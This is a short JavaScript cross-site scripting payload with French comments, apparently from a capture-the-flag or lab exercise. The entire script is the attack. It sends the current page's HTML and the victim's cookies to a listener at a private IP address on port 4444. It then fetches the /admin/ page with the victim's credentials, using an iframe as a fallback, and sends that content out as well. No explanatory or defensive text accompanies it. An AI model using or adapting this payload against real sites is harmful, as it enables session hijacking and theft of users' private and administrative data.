// Ultra simple - envoie tout le HTML de la page actuelle
const data = document.documentElement.outerHTML;
new Image().src = "http://10.139.32.179:4444/?html=" + encodeURIComponent(data);

// Envoyer aussi le cookie
new Image().src = "http://10.139.32.179:4444/?cookie=" + encodeURIComponent(document.cookie);

// Si on peut accéder à /admin/ via fetch, on le fait
fetch('/admin/', { credentials: 'include' })
    .then(r => r.text())
    .then(html => {
        new Image().src = "http://10.139.32.179:4444/?admin=" + encodeURIComponent(html.substring(0, 1000));
    })
    .catch(() => {
        // Si fetch échoue, on essaie avec une iframe
        const iframe = document.createElement('iframe');
        iframe.src = '/admin/';
        iframe.onload = function() {
            try {
                const html = iframe.contentDocument.documentElement.outerHTML;
                new Image().src = "http://10.139.32.179:4444/?iframe=" + encodeURIComponent(html.substring(0, 1000));
            } catch(e) {
                new Image().src = "http://10.139.32.179:4444/?iframe_error=" + encodeURIComponent(e.message);
            }
        };
        document.body.appendChild(iframe);
    });
